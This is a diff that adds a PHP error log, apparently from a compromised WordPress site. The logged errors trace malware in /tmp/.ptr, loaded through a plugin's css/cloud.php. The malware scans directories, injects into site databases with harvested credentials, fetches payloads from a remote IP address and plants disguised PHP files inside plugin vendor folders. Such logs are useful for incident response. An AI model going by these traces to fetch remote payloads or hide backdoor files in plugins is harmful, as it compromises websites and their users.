@@ -1,0 +1,98 @@
+[03-Nov-2025 18:14:41 America/Chicago] PHP Parse error:  syntax error, unexpected double-quote mark, expecting number in /tmp/.ptr on line 9
+[04-Nov-2025 18:04:00 America/Chicago] PHP Fatal error:  Uncaught mysqli_sql_exception: Access denied for user 'totraips_wp949'@'localhost' (using password: YES) in /tmp/.ptr:1
+Stack trace:
+#0 /tmp/.ptr(1): mysqli->__construct('localhost', 'totraips_wp949', Object(SensitiveParameterValue), 'totraips_wp949')
+#1 /tmp/.ptr(1): inject('/home3/totraips...')
+#2 /tmp/.ptr(1): scan('/home3/totraips...')
+#3 /tmp/.ptr(1): scan('/home3/totraips...')
+#4 /tmp/.ptr(1): scan('/home3/totraips')
+#5 /tmp/.ptr(1): scanRootPaths()
+#6 /home3/totraips/eerone.com/wp-content/plugins/convertpro/assets/css/cloud.php(3): include('/tmp/.ptr')
+#7 {main}
+  thrown in /tmp/.ptr on line 1
+[04-Nov-2025 23:31:24 America/Chicago] PHP Fatal error:  Uncaught mysqli_sql_exception: Access denied for user 'totraips_wp949'@'localhost' (using password: YES) in /tmp/.ptr:1
+Stack trace:
+#0 /tmp/.ptr(1): mysqli->__construct('localhost', 'totraips_wp949', Object(SensitiveParameterValue), 'totraips_wp949')
+#1 /tmp/.ptr(1): inject('/home3/totraips...')
+#2 /tmp/.ptr(1): scan('/home3/totraips...')
+#3 /tmp/.ptr(1): scan('/home3/totraips...')
+#4 /tmp/.ptr(1): scan('/home3/totraips')
+#5 /tmp/.ptr(1): scanRootPaths()
+#6 /home3/totraips/eerone.com/wp-content/plugins/convertpro/assets/css/cloud.php(3): include('/tmp/.ptr')
+#7 {main}
+  thrown in /tmp/.ptr on line 1
+[05-Nov-2025 11:38:43 America/Chicago] PHP Fatal error:  Uncaught mysqli_sql_exception: Access denied for user 'totraips_wp949'@'localhost' (using password: YES) in /tmp/.ptr:1
+Stack trace:
+#0 /tmp/.ptr(1): mysqli->__construct('localhost', 'totraips_wp949', Object(SensitiveParameterValue), 'totraips_wp949')
+#1 /tmp/.ptr(1): inject('/home3/totraips...')
+#2 /tmp/.ptr(1): scan('/home3/totraips...')
+#3 /tmp/.ptr(1): scan('/home3/totraips...')
+#4 /tmp/.ptr(1): scan('/home3/totraips')
+#5 /tmp/.ptr(1): scanRootPaths()
+#6 /home3/totraips/eerone.com/wp-content/plugins/convertpro/assets/css/cloud.php(3): include('/tmp/.ptr')
+#7 {main}
+  thrown in /tmp/.ptr on line 1
+[05-Nov-2025 13:44:36 America/Chicago] PHP Parse error:  syntax error, unexpected double-quote mark, expecting number in /tmp/.ptr on line 2
+[05-Nov-2025 17:24:31 America/Chicago] PHP Fatal error:  Uncaught mysqli_sql_exception: Access denied for user 'totraips_wp949'@'localhost' (using password: YES) in /tmp/.ptr:1
+Stack trace:
+#0 /tmp/.ptr(1): mysqli->__construct('localhost', 'totraips_wp949', Object(SensitiveParameterValue), 'totraips_wp949')
+#1 /tmp/.ptr(1): inject('/home3/totraips...')
+#2 /tmp/.ptr(1): scan('/home3/totraips...')
+#3 /tmp/.ptr(1): scan('/home3/totraips...')
+#4 /tmp/.ptr(1): scan('/home3/totraips')
+#5 /tmp/.ptr(1): scanRootPaths()
+#6 /home3/totraips/eerone.com/wp-content/plugins/convertpro/assets/css/cloud.php(3): include('/tmp/.ptr')
+#7 {main}
+  thrown in /tmp/.ptr on line 1
+[05-Nov-2025 23:10:35 America/Chicago] PHP Fatal error:  Uncaught mysqli_sql_exception: Access denied for user 'totraips_wp949'@'localhost' (using password: YES) in /tmp/.ptr:1
+Stack trace:
+#0 /tmp/.ptr(1): mysqli->__construct('localhost', 'totraips_wp949', Object(SensitiveParameterValue), 'totraips_wp949')
+#1 /tmp/.ptr(1): inject('/home3/totraips...')
+#2 /tmp/.ptr(1): scan('/home3/totraips...')
+#3 /tmp/.ptr(1): scan('/home3/totraips...')
+#4 /tmp/.ptr(1): scan('/home3/totraips')
+#5 /tmp/.ptr(1): scanRootPaths()
+#6 /home3/totraips/eerone.com/wp-content/plugins/convertpro/assets/css/cloud.php(3): include('/tmp/.ptr')
+#7 {main}
+  thrown in /tmp/.ptr on line 1
+[06-Nov-2025 02:30:14 America/Chicago] PHP Warning:  file_get_contents(http://62.60.131.254/tmp/VjKEqAHMKp): Failed to open stream: Connection refused in /tmp/.ptr on line 1
+[06-Nov-2025 03:08:37 America/Chicago] PHP Warning:  file_get_contents(http://62.60.131.254/tmp/iByEOrUNLS): Failed to open stream: Connection refused in /tmp/.ptr on line 1
+[06-Nov-2025 05:58:50 America/Chicago] PHP Fatal error:  Uncaught mysqli_sql_exception: Access denied for user 'totraips_wp949'@'localhost' ([06-Nov-2025 23:28:03 America/Chicago] PHP Fatal error:  Uncaught mysqli_sql_exception: Access denied for user 'totraips_wp949'@'localhost' (using password: YES) in /tmp/.ptr:1
+Stack trace:
+#0 /tmp/.ptr(1): mysqli->__construct('localhost', 'totraips_wp949', Object(SensitiveParameterValue), 'totraips_wp949')
+#1 /tmp/.ptr(1): inject('/home3/totraips...')
+#2 /tmp/.ptr(1): scan('/home3/totraips...')
+#3 /tmp/.ptr(1): scan('/home3/totraips...')
+#4 /tmp/.ptr(1): scan('/home3/totraips')
+#5 /tmp/.ptr(1): scanRootPaths()
+#6 /home3/totraips/eerone.com/wp-content/plugins/convertpro/assets/css/cloud.php(3): include('/tmp/.ptr')
+#7 {main}
+  thrown in /tmp/.ptr on line 1
+[07-Nov-2025 10:55:23 America/Chicago] PHP Parse error:  syntax error, unexpected double-quote mark, expecting number in /tmp/.ptr on line 4
+[07-Nov-2025 11:18:38 America/Chicago] PHP Fatal error:  Uncaught mysqli_sql_exception: Access denied for user 'totraips_wp949'@'localhost' (using password: YES) in /tmp/.ptr:1
+Stack trace:
+#0 /tmp/.ptr(1): mysqli->__construct('localhost', 'totraips_wp949', Object(SensitiveParameterValue), 'totraips_wp949')
+#1 /tmp/.ptr(1): inject('/home3/totraips...')
+#2 /tmp/.ptr(1): scan('/home3/totraips...')
+#3 /tmp/.ptr(1): scan('/home3/totraips...')
+#4 /tmp/.ptr(1): scan('/home3/totraips')
+#5 /tmp/.ptr(1): scanRootPaths()
+#6 /home3/totraips/eerone.com/wp-content/plugins/convertpro/assets/css/cloud.php(3): include('/tmp/.ptr')
+#7 {main}
+  thrown in /tmp/.ptr on line 1
+[07-Nov-2025 17:21:47 America/Chicago] PHP Fatal error:  Uncaught mysqli_sql_exception: Access denied for user 'totraips_wp685'@'localhost' (using password: YES) in /tmp/.ptr:1
+Stack trace:
+#0 /tmp/.ptr(1): mysqli->__construct('localhost', 'totraips_wp685', Object(SensitiveParameterValue), 'totraips_wp685')
+#1 /tmp/.ptr(1): inject('/home3/totraips...')
+#2 /tmp/.ptr(1): scan('/home3/totraips...')
+#3 /tmp/.ptr(1): scan('/home3/totraips')
+#4 /tmp/.ptr(1): scanRootPaths()
+#5 /home3/totraips/eerone.com/wp-content/plugins/convertpro/assets/css/cloud.php(3): include('/tmp/.ptr')
+#6 {main}
+  thrown in /tmp/.ptr on line 1
+[08-Nov-2025 09:18:11 UTC] PHP Warning:  file_put_contents(/home3/totraips/eerone.com/wp-content/plugins/wpidea/vendor/nikic/php-parser/lib/PhpParser/Node/Expr/AssignOp/menus.php): Failed to open stream: No such file or directory in /tmp/.ptr on line 1
+[08-Nov-2025 10:20:34 UTC] PHP Warning:  file_put_contents(/home3/totraips/eerone.com/wp-content/plugins/elementor/vendor_prefixed/twig/twig/twig/src/Node/Expression/Test/setgrands.php): Failed to open stream: No such file or directory in /tmp/.ptr on line 1
+[08-Nov-2025 15:24:10 UTC] PHP Parse error:  syntax error, unexpected double-quote mark, expecting number in /tmp/.ptr on line 11
+[08-Nov-2025 21:37:35 UTC] PHP Warning:  file_put_contents(/home3/totraips/eerone.com/wp-content/plugins/wpforms-lite/src/Integrations/ConstantContact/V3/Api/Http/technicalReports.php): Failed to open stream: No such file or directory in /tmp/.ptr on line 1
+[08-Nov-2025 22:13:16 UTC] PHP Warning:  file_put_contents(/home3/totraips/eerone.com/wp-content/plugins/woocommerce/vendor/wordpress/mcp-adapter/includes/Handlers/Initialize/cookie_setup.php): Failed to open stream: No such file or directory in /tmp/.ptr on line 1
+[09-Nov-2025 09:37:10 UTC] PHP Warning:  file_put_contents(/home3/totraips/eerone.com/wp-content/plugins/wpforms-lite/vendor_prefixed/tijsverkoyen/css-to-inline-styles/src/Css/Rule/toolbar.checkin.php): Failed to open stream: No such file or directory in /tmp/.ptr on line 1
